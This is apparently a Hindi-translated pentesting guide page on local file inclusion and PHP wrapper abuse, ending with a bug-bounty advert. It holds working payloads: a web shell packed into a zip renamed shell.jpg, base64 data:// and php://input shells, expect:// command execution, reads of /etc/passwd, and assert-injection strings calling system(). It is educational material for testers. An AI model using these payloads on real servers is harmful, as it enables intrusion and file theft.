рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **`file_name`** рдХреЗ рд▓рд┐рдП **рдкреВрд░реНрдг рдкрде** рдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдкрд┐рдЫрд▓рд╛ рдкрде рд╕рд┐рд░реНрдл рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
рдпрд╣ рд╡рд╣ рдЗрдЪреНрдЫрд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝](https://docs.python.org/3.10/library/os.path.html#os.path.join) рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:

> рдпрджрд┐ рдХреЛрдИ рдШрдЯрдХ рдПрдХ рдкреВрд░реНрдг рдкрде рд╣реИ, рддреЛ рд╕рднреА рдкрд┐рдЫрд▓реЗ рдШрдЯрдХ рдЫреЛрдбрд╝ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдЬреЛрдбрд╝рдирд╛ рдЕрдм рдкреВрд░реНрдг рдкрде рдШрдЯрдХ рд╕реЗ рдЬрд╛рд░реА рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред

## рдЬрд╛рд╡рд╛ рд▓рд┐рд╕реНрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЬрд╛рд╡рд╛ рдореЗрдВ рдПрдХ рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╣реИ рдФрд░ рдЖрдк **рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддреЗ рд╣реИрдВ**, рддреЛ **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕реВрдЪреА рд▓реМрдЯрд╛рдИ рдЬрд╛рддреА рд╣реИ**ред рдпрд╣ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдЧрд╛ (рдЬрд╣рд╛рдВ рддрдХ рдореЗрд░рд╛ рдЬреНрдЮрд╛рди рд╣реИ)ред

## рд╢реАрд░реНрд╖ 25 рдкреИрд░рд╛рдореАрдЯрд░

рдпрд╣рд╛рдВ рдПрдХ рд╢реАрд░реНрд╖ 25 рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреА рд╕реВрдЪреА рд╣реИ рдЬреЛ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди (LFI) рд╕рдВрдХрдЯрд╛рд╕реНрдкрджрддрд╛ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ (рд╕реНрд░реЛрдд: [рд▓рд┐рдВрдХ](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ PHP рд░реИрдкрд░реНрд╕ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

### php://filter

PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдбреЗрдЯрд╛ рдХреЛ рдкрдврд╝рдиреЗ рдпрд╛ рд▓рд┐рдЦрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдбреЗрдЯрд╛ рдкрд░ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ 5 рд╢реНрд░реЗрдгрд┐рдпрд╛рдБ рд╣реИрдВ:

* [рд╕реНрдЯреНрд░рд┐рдВрдЧ рдлрд╝рд┐рд▓реНрдЯрд░](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: рдбреЗрдЯрд╛ рд╕реЗ рдЯреИрдЧ рд╣рдЯрд╛рдПрдВ ("<" рдФрд░ ">" рдЪрд░ рдХреЗ рдмреАрдЪ рдХреБрдЫ рднреА)
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдлрд╝рд┐рд▓реНрдЯрд░ PHP рдХреЗ рдЖрдзреБрдирд┐рдХ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рд╕реЗ рдЧрд╛рдпрдм рд╣реЛ рдЧрдпрд╛ рд╣реИ
* [рд░реВрдкрд╛рдВрддрд░рдг рдлрд╝рд┐рд▓реНрдЯрд░](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : рдПрдХ рдЕрд▓рдЧ рдЗрдВрдХреЛрдбрд┐рдВрдЧ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рддрд╛ рд╣реИ (`convert.iconv.<input_enc>.<output_enc>`)ред рд╕рдорд░реНрдерд┐рдд рд╕рднреА рдЗрдВрдХреЛрдбрд┐рдВрдЧ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдВрд╕реЛрд▓ рдореЗрдВ рдЪрд▓рд╛рдПрдВ: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` рдкрд░рд┐рд╡рд░реНрддрди рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдЕрдирд┐рдпрдорд┐рдд рдкрд╛рда** рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдЕрдирд┐рдпрдорд┐рдд рдкрд╛рда рд▓рд┐рдЦрдиреЗ рдпрд╛ рдЕрдирд┐рдпрдорд┐рдд рдкрд╛рда рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдиреЗ рдЬреИрд╕реЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) рджреЗрдЦреЗрдВред
{% endhint %}

* [рд╕рдВрдкреАрдбрд╝рди рдлрд╝рд┐рд▓реНрдЯрд░](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕рдВрдкреАрдбрд╝рд┐рдд рдХрд░реЗрдВ (рдпрджрд┐ рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреА рд╣реЛ)
* `zlib.inflate`: рдбреЗрдЯрд╛ рдХреЛ рдЕрдирд╕рдВрдкреАрдбрд╝рд┐рдд рдХрд░реЗрдВ
* [рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдлрд╝рд┐рд▓реНрдЯрд░](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : рд╡рд┐рдЪрд╛рд░рд╢реАрд▓
* `mdecrypt.*` : рд╡рд┐рдЪрд╛рд░рд╢реАрд▓
* рдЕрдиреНрдп рдлрд╝рд┐рд▓реНрдЯрд░
* php рдореЗрдВ рдЪрд▓рд╛рдПрдВ `var_dump(stream_get_filters());` рдЖрдкрдХреЛ рдХреБрдЫ **рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдлрд╝рд┐рд▓реНрдЯрд░** рдорд┐рд▓реЗрдВрдЧреЗ:
* `consumed`
* `dechunk`: HTTP рдЪрдВрдХ рдХреЛ рдкрд▓рдЯрддрд╛ рд╣реИ
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,┬гhellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
рднрд╛рдЧ "php://filter" рдорд╛рдорд▓реЗ рдореЗрдВ рдЕрд╡рдЧрдд рд╣реИ
{% endhint %}

### php://fd

рдпрд╣ рд░реИрдкрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдЦреЛрд▓реЗ рдЧрдП рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рджреЗрддрд╛ рд╣реИред рдЦреЛрд▓реА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИ:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
рдЖрдк рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ 0, 1 рдФрд░ 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **php://stdin, php://stdout рдФрд░ php://stderr** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рдХреИрд╕реЗ рд╣рдорд▓реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рд╣реИ)

### zip:// рдФрд░ rar://

рдПрдХ PHPShell рдХреЗ рд╕рд╛рде рдПрдХ рдЬрд╝рд┐рдк рдпрд╛ рд░рд╛рд░ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВред\
рд░рд╛рд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдХреНрд░рд┐рдп** рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### рдбреЗрдЯрд╛://

рдбреЗрдЯрд╛:// URL рд╕реНрдХреАрдо рдПрдХ рд╡рд┐рд╢реЗрд╖ URL рд╕реНрдХреАрдо рд╣реИ рдЬреЛ рдбреЗрдЯрд╛ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ URL рд╕реНрдХреАрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдПрдХ рд▓рд┐рдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рдЗрдирд░реА рдпрд╛ рдкрд╛рда рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ URL рд╕реНрдХреАрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдкрд░ рд╕реАрдзреЗ рдПрдореНрдмреЗрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг:
```html
<a href="data:text/plain;base64,SGVsbG8gV29ybGQh">рдпрд╣рд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ</a>
```

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдЧрд╛, рддреЛ "Hello World!" рдЯреЗрдХреНрд╕реНрдЯ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ред
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
рдордЬреЗрджрд╛рд░ рддрдереНрдп: рдЖрдк рдПрдХреНрд╕рдПрд╕рдПрд╕ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреНрд░реЛрдо рдСрдбрд┐рдЯрд░ рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ php рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди **`allow_url_open`** рдФрд░ **`allow_url_include`** рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реЛрддрд╛ рд╣реИред

### expect://

Expect рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### рдЗрдирдкреБрдЯ://

рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдкреЛрд╕реНрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

рдПрдХ `.phar` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ PHP рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдпрджрд┐ рд╡реЗрдм рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ `include` рдлрд╝рдВрдХреНрд╢рди рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

рдФрд░ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ `phar` рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
php --define phar.readonly=0 create_path.php
```
рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо `test.phar` рд╣реЛрдЧрд╛ рдЙрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк LFI рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ LFI рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рднреАрддрд░ php рдХреЛрдб рдХреЛ рдирд╣реАрдВ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**file\_get\_contents(), fopen(), file() рдпрд╛ file\_exists(), md5\_file(), filemtime() рдпрд╛ filesize()**_**_ рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред рддреЛ рдЖрдк **phar** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреЗ рд╕рдордп рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ **рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдкрдврд╝реЗрдВ:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### рдЕрдзрд┐рдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

рдпрд╣рд╛рдВ рдФрд░ рднреА рд╕рдВрднрд╛рд╡рд┐рдд [**рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**](https://www.php.net/manual/en/wrappers.php)**:** рджреЗрдЦреЗрдВ

* [php://memory рдФрд░ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) тАФ рдореЗрдореЛрд░реА рдореЗрдВ рдпрд╛ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреЗрдВ (рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди рд╣рдорд▓реЗ рдореЗрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ)
* [file://](https://www.php.net/manual/en/wrappers.file.php) тАФ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдБрдЪ
* [http://](https://www.php.net/manual/en/wrappers.http.php) тАФ HTTP(s) URLs рддрдХ рдкрд╣реБрдБрдЪ
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) тАФ FTP(s) URLs рддрдХ рдкрд╣реБрдБрдЪ
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) тАФ рд╕рдВрдкреАрдбрд╝рди рд╕реНрдЯреНрд░реАрдо
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) тАФ рдкреИрдЯрд░реНрди рдХреЗ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓реЗ рдкрд╛рдердирд╛рдо рдвреВрдВрдвреЗрдВ (рдпрд╣ рдХреБрдЫ рднреА рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдирд╣реАрдВ рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдВ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) тАФ рд╕реБрд░рдХреНрд╖рд┐рдд рд╢реЗрд▓ 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) тАФ рдСрдбрд┐рдпреЛ рд╕реНрдЯреНрд░реАрдо (рд╡рд┐рдЪрд┐рддреНрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ)

## PHP рдХреЗ 'assert' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ LFI

рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдХрдард┐рди LFI рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ ".." рдЬреИрд╕реА рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ "рд╣реИрдХрд┐рдВрдЧ рдкреНрд░рдпрд╛рд╕" рдпрд╛ "рдЕрдЪреНрдЫрд╛ рдкреНрд░рдпрд╛рд╕!" рдЬреИрд╕рд╛ рдХреБрдЫ рдЬрд╡рд╛рдм рджреЗ рд░рд╣рд╛ рд╣реИ, рддреЛ 'assert' рдЗрдВрдЬреЗрдХреНрд╢рди рдкреЗрд▓реЛрдб рдХрд╛рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рддрд░рд╣ рдХрд╛ рдПрдХ рдкреЗрд▓реЛрдб:
```
' and die(show_source('/etc/passwd')) or '
```
рдпрд╣рд╛рдВ рдПрдХ "рдлрд╝рд╛рдЗрд▓" рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд▓рд┐рдП PHP рдХреЛрдб рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВрдЧреЗ рдЬреЛ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ:
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
рдПрдХ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд "assert" рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ system() рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```
' and die(system("whoami")) or '
```
рдЕрдкрдиреЗ рдкреЗрд╢рдХрд╢реЛрдВ рдХреЛ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдкреБрдирд░реНрдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ URL-encode рдХрд░реЗрдВред

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рд╕рднреА рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХреЗ рд▓рд┐рдП рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдкреБрд░рд╕реНрдХрд╛рд░ рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдмрдЧ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдкреБрд░рд╕реНрдХрд╛рд░ рдорд┐рд▓реЗрдЧрд╛ред

**рд╡реЗрдм3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЙрдирдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**рд╡реЗрдм3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
